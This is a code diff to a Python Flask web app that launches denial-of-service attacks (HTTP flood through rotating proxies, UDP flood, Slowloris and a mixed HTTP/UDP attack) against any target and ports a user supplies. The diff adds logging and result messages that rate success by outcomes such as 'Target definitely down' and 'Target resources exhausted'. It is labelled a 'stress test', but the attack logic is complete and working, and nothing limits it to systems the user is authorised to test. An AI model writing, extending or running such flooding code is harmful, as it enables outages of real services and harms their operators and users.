@@ -7,6 +7,7 @@ import os
 import json
 from concurrent.futures import ThreadPoolExecutor
 import requests
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -22,7 +23,9 @@ attack_status = {
     'rps_history': [],
     'current_rps': 0,
     'avg_rps': 0,
-    'active_connections': []
+    'active_connections': [],
+    'test_logs': [],
+    'final_results': None
 }
 
 proxies_list = []
@@ -32,10 +35,28 @@ class WebNetworkTester:
     def __init__(self):
         self.is_testing = False
         
+    def log_message(self, message):
+        """Add message to test logs with timestamp"""
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        log_entry = f"[{timestamp}] {message}"
+        attack_status['test_logs'].append(log_entry)
+        # Keep only last 100 log entries
+        attack_status['test_logs'] = attack_status['test_logs'][-100:]
+        
     def ultra_http_flood(self, target, ports, duration, threads_count, max_requests, use_proxies):
         """HTTP Flood attack with multiple ports and proxy support"""
         end_time = time.time() + duration
         request_count = 0
+        start_time = time.time()
+        
+        self.log_message(f"🚀 STARTING ULTRA STRESS TEST: ULTRA_HTTP")
+        self.log_message(f"🎯 Target: {target}")
+        self.log_message(f"🔢 Ports: {ports}")
+        self.log_message(f"⏱️ Duration: {duration}s")
+        self.log_message(f"🧵 Threads: {threads_count}")
+        self.log_message(f"📨 Requests: {max_requests if max_requests > 0 else 'Unlimited'}")
+        self.log_message(f"🔌 Use Proxies: {'Yes' if use_proxies else 'No'}")
+        self.log_message("=" * 50)
         
         def worker(worker_id):
             nonlocal request_count
@@ -74,17 +95,10 @@ class WebNetworkTester:
                     local_count += 1
                     request_count += 1
                     
-                    # Update connection info
-                    conn_info = {
-                        'type': 'HTTP',
-                        'target': f"{target}:{port}",
-                        'proxy': proxy_config['address'] if proxy_config else 'Direct',
-                        'status': 'Success',
-                        'timestamp': time.time()
-                    }
-                    attack_status['active_connections'].append(conn_info)
-                    # Keep only last 50 connections
-                    attack_status['active_connections'] = attack_status['active_connections'][-50:]
+                    # Log progress every 1000 requests
+                    if local_count % 1000 == 0:
+                        proxy_info = f" via {proxy_config['address']}" if proxy_config else ""
+                        self.log_message(f"🚀 Worker {worker_id}: {local_count:,} requests{proxy_info}")
                     
                 except Exception as e:
                     attack_status['failed_requests'] += 1
@@ -93,29 +107,40 @@ class WebNetworkTester:
                 attack_status['requests_sent'] += 1
                 
                 # Update RPS calculations
-                current_time = time.time()
-                if attack_status['start_time']:
-                    elapsed = current_time - attack_status['start_time']
-                    if elapsed > 0:
-                        attack_status['current_rps'] = attack_status['requests_sent'] / elapsed
-                        attack_status['rps_history'].append(attack_status['current_rps'])
-                        attack_status['rps_history'] = attack_status['rps_history'][-100:]
-                        if attack_status['rps_history']:
-                            attack_status['avg_rps'] = sum(attack_status['rps_history']) / len(attack_status['rps_history'])
+                self.update_rps_stats()
         
         with ThreadPoolExecutor(max_workers=threads_count) as executor:
             futures = [executor.submit(worker, i) for i in range(threads_count)]
             for future in futures:
                 future.result()
+        
+        # Log final results
+        self.log_http_results(start_time, request_count)
 
     def enhanced_udp_flood(self, target, ports, duration, threads_count, max_requests, use_proxies):
         """Enhanced UDP Flood attack"""
         end_time = time.time() + duration
-        packet_size = 1024
+        packet_size = 1450
         request_count = 0
+        bytes_sent = 0
+        start_time = time.time()
+        
+        self.log_message(f"🚀 STARTING ULTRA STRESS TEST: ENHANCED_UDP")
+        self.log_message(f"🎯 Target: {target}")
+        self.log_message(f"🔢 Ports: {ports}")
+        self.log_message(f"⏱️ Duration: {duration}s")
+        self.log_message(f"🧵 Threads: {threads_count}")
+        self.log_message(f"📨 Requests: {max_requests if max_requests > 0 else 'Unlimited'}")
+        self.log_message(f"🔌 Use Proxies: {'Yes' if use_proxies else 'No'}")
+        self.log_message("=" * 50)
+        self.log_message(f"🚀 Starting ENHANCED UDP Flood: {threads_count} workers, {packet_size} byte packets")
+        self.log_message("=" * 50)
         
         def udp_worker(worker_id):
-            nonlocal request_count
+            nonlocal request_count, bytes_sent
+            local_count = 0
+            local_bytes = 0
+            
             while (time.time() < end_time and self.is_testing and 
                    (max_requests == 0 or request_count < max_requests)):
                 try:
@@ -129,36 +154,49 @@ class WebNetworkTester:
                     
                     attack_status['packets_sent'] += 1
                     request_count += 1
+                    local_count += 1
+                    local_bytes += len(payload)
+                    bytes_sent += len(payload)
                     attack_status['requests_sent'] += 1
                     
-                    # Update connection info
-                    conn_info = {
-                        'type': 'UDP',
-                        'target': f"{target}:{port}",
-                        'proxy': 'N/A (UDP)',
-                        'status': 'Sent',
-                        'timestamp': time.time()
-                    }
-                    attack_status['active_connections'].append(conn_info)
-                    attack_status['active_connections'] = attack_status['active_connections'][-50:]
+                    # Log progress every 500 packets
+                    if local_count % 500 == 0:
+                        mb_sent = local_bytes / (1024 * 1024)
+                        self.log_message(f"📦 UDP Worker {worker_id}: {local_count:,} packets, {mb_sent:.1f} MB")
                     
                 except Exception as e:
                     attack_status['failed_requests'] += 1
                     request_count += 1
                     attack_status['requests_sent'] += 1
+                
+                # Update RPS calculations
+                self.update_rps_stats()
         
         with ThreadPoolExecutor(max_workers=threads_count) as executor:
             futures = [executor.submit(udp_worker, i) for i in range(threads_count)]
             for future in futures:
                 future.result()
+        
+        # Log final results
+        self.log_udp_results(start_time, request_count, bytes_sent)
 
     def slowloris_attack(self, target, ports, duration, threads_count, max_requests, use_proxies):
         """Slowloris attack"""
         end_time = time.time() + duration
         sockets = []
         request_count = 0
+        start_time = time.time()
         
-        def slowloris_worker():
+        self.log_message(f"🚀 STARTING ULTRA STRESS TEST: SLOWLORIS")
+        self.log_message(f"🎯 Target: {target}")
+        self.log_message(f"🔢 Ports: {ports}")
+        self.log_message(f"⏱️ Duration: {duration}s")
+        self.log_message(f"🧵 Threads: {threads_count}")
+        self.log_message(f"📨 Requests: {max_requests if max_requests > 0 else 'Unlimited'}")
+        self.log_message(f"🔌 Use Proxies: {'Yes' if use_proxies else 'No'}")
+        self.log_message("=" * 50)
+        
+        def slowloris_worker(worker_id):
             nonlocal request_count
             try:
                 port = random.choice(ports)
@@ -180,16 +218,9 @@ class WebNetworkTester:
                 sockets.append(sock)
                 request_count += 1
                 
-                # Update connection info
-                conn_info = {
-                    'type': 'Slowloris',
-                    'target': f"{target}:{port}",
-                    'proxy': 'Direct',
-                    'status': 'Connected',
-                    'timestamp': time.time()
-                }
-                attack_status['active_connections'].append(conn_info)
-                attack_status['active_connections'] = attack_status['active_connections'][-50:]
+                # Log socket creation
+                if request_count % 50 == 0:
+                    self.log_message(f"🐌 Slowloris: {request_count} sockets active")
                 
                 # Keep connection alive
                 while time.time() < end_time and self.is_testing:
@@ -204,7 +235,7 @@ class WebNetworkTester:
                 request_count += 1
         
         with ThreadPoolExecutor(max_workers=min(threads_count, 200)) as executor:
-            futures = [executor.submit(slowloris_worker) for _ in range(min(threads_count, 200))]
+            futures = [executor.submit(slowloris_worker, i) for i in range(min(threads_count, 200))]
             for future in futures:
                 future.result()
         
@@ -214,40 +245,71 @@ class WebNetworkTester:
                 sock.close()
             except:
                 pass
+        
+        # Log final results
+        self.log_slowloris_results(start_time, request_count)
 
     def mixed_attack(self, target, ports, duration, threads_count, max_requests, use_proxies):
         """Mixed attack using multiple methods"""
         end_time = time.time() + duration
+        start_time = time.time()
+        total_requests = 0
+        
+        self.log_message(f"🚀 STARTING ULTRA STRESS TEST: MIXED_ALL")
+        self.log_message(f"🎯 Target: {target}")
+        self.log_message(f"🔢 Ports: {ports}")
+        self.log_message(f"⏱️ Duration: {duration}s")
+        self.log_message(f"🧵 Threads: {threads_count}")
+        self.log_message(f"📨 Requests: {max_requests if max_requests > 0 else 'Unlimited'}")
+        self.log_message(f"🔌 Use Proxies: {'Yes' if use_proxies else 'No'}")
+        self.log_message("=" * 50)
+        self.log_message("💥 Starting MIXED attack - Combining HTTP + UDP methods")
         
         def http_worker():
-            request_count = 0
+            local_count = 0
             while (time.time() < end_time and self.is_testing and 
-                   (max_requests == 0 or request_count < max_requests)):
+                   (max_requests == 0 or total_requests < max_requests)):
                 try:
                     port = random.choice(ports)
                     response = requests.get(f"http://{target}:{port}/", timeout=2)
                     attack_status['successful_requests'] += 1
-                    request_count += 1
+                    local_count += 1
+                    nonlocal total_requests
+                    total_requests += 1
                 except:
                     attack_status['failed_requests'] += 1
-                    request_count += 1
+                    local_count += 1
+                    total_requests += 1
                 attack_status['requests_sent'] += 1
+                
+                if local_count % 500 == 0:
+                    self.log_message(f"🚀 HTTP Worker: {local_count:,} requests")
+                
+                self.update_rps_stats()
         
         def udp_worker():
-            request_count = 0
+            local_count = 0
             while (time.time() < end_time and self.is_testing and 
-                   (max_requests == 0 or request_count < max_requests)):
+                   (max_requests == 0 or total_requests < max_requests)):
                 try:
                     port = random.choice(ports)
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    payload = os.urandom(512)
+                    payload = os.urandom(1024)
                     sock.sendto(payload, (target, port))
                     sock.close()
                     attack_status['packets_sent'] += 1
-                    request_count += 1
+                    local_count += 1
+                    nonlocal total_requests
+                    total_requests += 1
                 except:
-                    request_count += 1
+                    local_count += 1
+                    total_requests += 1
                 attack_status['requests_sent'] += 1
+                
+                if local_count % 500 == 0:
+                    self.log_message(f"📦 UDP Worker: {local_count:,} packets")
+                
+                self.update_rps_stats()
         
         # Use half threads for HTTP, half for UDP
         http_threads = max(1, threads_count // 2)
@@ -259,6 +321,118 @@ class WebNetworkTester:
             
             for future in http_futures + udp_futures:
                 future.result()
+        
+        # Log final results
+        self.log_mixed_results(start_time, total_requests)
+
+    def update_rps_stats(self):
+        """Update RPS calculations"""
+        current_time = time.time()
+        if attack_status['start_time']:
+            elapsed = current_time - attack_status['start_time']
+            if elapsed > 0:
+                attack_status['current_rps'] = attack_status['requests_sent'] / elapsed
+                attack_status['rps_history'].append(attack_status['current_rps'])
+                attack_status['rps_history'] = attack_status['rps_history'][-100:]
+                if attack_status['rps_history']:
+                    attack_status['avg_rps'] = sum(attack_status['rps_history']) / len(attack_status['rps_history'])
+
+    def log_http_results(self, start_time, total_requests):
+        """Log HTTP flood final results"""
+        end_time = time.time()
+        elapsed = end_time - start_time
+        rps = total_requests / elapsed if elapsed > 0 else 0
+        
+        self.log_message("=" * 50)
+        self.log_message("📊 ULTRA HTTP FLOOD COMPLETED:")
+        self.log_message(f"   ✅ Total Requests: {total_requests:,}")
+        self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
+        self.log_message(f"   🚀 Average RPS: {rps:,.2f}")
+        self.log_message(self.get_performance_rating(rps))
+        self.log_final_summary(start_time, total_requests)
+
+    def log_udp_results(self, start_time, total_packets, total_bytes):
+        """Log UDP flood final results"""
+        end_time = time.time()
+        elapsed = end_time - start_time
+        packets_per_second = total_packets / elapsed if elapsed > 0 else 0
+        mb_per_second = (total_bytes / (1024 * 1024)) / elapsed if elapsed > 0 else 0
+        
+        self.log_message("=" * 50)
+        self.log_message("📊 ENHANCED UDP FLOOD COMPLETED:")
+        self.log_message(f"   📦 Total Packets: {total_packets:,}")
+        self.log_message(f"   💾 Total Data: {total_bytes / (1024*1024):.1f} MB")
+        self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
+        self.log_message(f"   🚀 Packets/Second: {packets_per_second:,.0f}")
+        self.log_message(f"   📊 Bandwidth: {mb_per_second:.1f} MB/s")
+        
+        if packets_per_second > 10000:
+            self.log_message("   💥 NUCLEAR UDP FLOOD - Maximum impact achieved!")
+        elif packets_per_second > 5000:
+            self.log_message("   ⚡ EXTREME UDP FLOOD - Heavy impact!")
+        elif packets_per_second > 1000:
+            self.log_message("   🔥 HIGH INTENSITY - Good impact!")
+        
+        self.log_final_summary(start_time, total_packets)
+
+    def log_slowloris_results(self, start_time, total_sockets):
+        """Log Slowloris final results"""
+        end_time = time.time()
+        elapsed = end_time - start_time
+        
+        self.log_message("=" * 50)
+        self.log_message("📊 SLOWLORIS ATTACK COMPLETED:")
+        self.log_message(f"   🔗 Total Sockets: {total_sockets:,}")
+        self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
+        
+        if total_sockets > 400:
+            self.log_message("   💥 MAXIMUM CONNECTIONS - Target resources exhausted!")
+        elif total_sockets > 200:
+            self.log_message("   ⚡ HEAVY LOAD - Target severely impacted!")
+        elif total_sockets > 100:
+            self.log_message("   🔥 MEDIUM IMPACT - Target may be stressed!")
+        
+        self.log_final_summary(start_time, total_sockets)
+
+    def log_mixed_results(self, start_time, total_operations):
+        """Log Mixed attack final results"""
+        end_time = time.time()
+        elapsed = end_time - start_time
+        rps = total_operations / elapsed if elapsed > 0 else 0
+        
+        self.log_message("=" * 50)
+        self.log_message("📊 MIXED ATTACK COMPLETED:")
+        self.log_message(f"   💥 Total Operations: {total_operations:,}")
+        self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
+        self.log_message(f"   🚀 Average RPS: {rps:,.2f}")
+        self.log_message(self.get_performance_rating(rps))
+        self.log_final_summary(start_time, total_operations)
+
+    def log_final_summary(self, start_time, total_requests):
+        """Log final summary for all attack types"""
+        end_time = time.time()
+        elapsed = end_time - start_time
+        rps = total_requests / elapsed if elapsed > 0 else 0
+        
+        self.log_message("=" * 50)
+        self.log_message("📊 STRESS TEST COMPLETED:")
+        self.log_message(f"   ✅ Total Requests: {total_requests:,}")
+        self.log_message(f"   ⏱️ Duration: {elapsed:.2f}s")
+        self.log_message(f"   🚀 Average RPS: {rps:,.2f}")
+        self.log_message(self.get_performance_rating(rps))
+
+    def get_performance_rating(self, rps):
+        """Get performance rating based on RPS"""
+        if rps > 10000:
+            return "   💥 NUCLEAR LOAD GENERATED - Target definitely down"
+        elif rps > 5000:
+            return "   ⚡ EXTREME LOAD GENERATED - Target likely crashed"
+        elif rps > 1000:
+            return "   🔥 HIGH LOAD GENERATED - Target severely impacted"
+        elif rps > 500:
+            return "   ⚡ MEDIUM LOAD - Target may be stressed"
+        else:
+            return "   🔧 LIGHT LOAD - Target may handle this"
 
     def get_random_ua(self):
         """Get random user agent"""
@@ -272,13 +446,10 @@ class WebNetworkTester:
 
 tester = WebNetworkTester()
 
-# Proxy Management Functions
+# Proxy Management Functions (keep existing proxy functions)
 def load_proxies():
-    """Load proxies from file"""
     global proxies_list, active_proxies
     try:
-        # In a real application, you'd load from a database or file
-        # For now, we'll keep them in memory
         proxies_list = []
         active_proxies = []
     except:
@@ -286,12 +457,9 @@ def load_proxies():
         active_proxies = []
 
 def save_proxies():
-    """Save proxies to file"""
-    # In a real application, you'd save to a database or file
     pass
 
 def check_proxy(proxy):
-    """Check if a proxy is working"""
     try:
         start_time = time.time()
         proxies = {
@@ -341,7 +509,6 @@ def add_proxy():
         'password': data.get('password', '')
     }
     
-    # Check for duplicates
     if not any(p['address'] == proxy['address'] and p['port'] == proxy['port'] for p in proxies_list):
         proxies_list.append(proxy)
         active_proxies.append(proxy)
@@ -408,7 +575,6 @@ def check_proxies_route():
         active_proxies = working_proxies
         save_proxies()
     
-    # Run in background thread
     thread = threading.Thread(target=check_all_proxies)
     thread.daemon = True
     thread.start()
@@ -426,7 +592,7 @@ def start_attack():
     method = data['method']
     use_proxies = data.get('use_proxies', False)
     
-    # Reset status
+    # Reset status and logs
     attack_status.update({
         'is_running': True,
         'requests_sent': 0,
@@ -438,7 +604,9 @@ def start_attack():
         'rps_history': [],
         'current_rps': 0,
         'avg_rps': 0,
-        'active_connections': []
+        'active_connections': [],
+        'test_logs': [],
+        'final_results': None
     })
     
     # Start attack in background thread
@@ -454,7 +622,7 @@ def start_attack():
             elif method == 'mixed':
                 tester.mixed_attack(target, ports, duration, threads, max_requests, use_proxies)
         except Exception as e:
-            print(f"Attack error: {e}")
+            tester.log_message(f"❌ Stress test error: {str(e)}")
         finally:
             tester.is_testing = False
             attack_status['is_running'] = False
@@ -474,6 +642,11 @@ def stop_attack():
     tester.is_testing = False
     attack_status['is_running'] = False
     return jsonify({'status': 'Attack stopped'})
+
+@app.route('/clear_logs')
+def clear_logs():
+    attack_status['test_logs'] = []
+    return jsonify({'status': 'Logs cleared'})
 
 # Initialize
 load_proxies()
